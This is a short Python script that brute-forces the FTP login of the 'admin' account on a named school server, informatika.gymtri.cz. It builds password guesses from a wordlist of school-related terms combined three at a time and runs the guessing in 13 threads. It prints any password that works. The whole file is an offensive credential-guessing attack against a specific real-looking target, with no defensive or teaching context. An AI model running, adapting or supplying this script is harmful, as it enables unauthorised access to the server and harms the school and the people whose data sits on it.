import ftplib
import threading

dic = ["","gymtri","Gymtri","Gymnazium","gymnazium","713","317","komenskeho","Komenskeho"]

proxy = {}

username = "admin"
thread_num = 13
threads=  []

def thread_function():
    for i in dic:
        for j in dic:
            for k in dic:
                try:
                    ftp = ftplib.FTP("informatika.gymtri.cz", "admin", i+j+k)
                except:
                    print("nah",end=" ")
                    continue

                print(i+j+k,"valid!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")


for i in range(thread_num):
    threads.append(threading.Thread(target=thread_function))
    threads[i].start()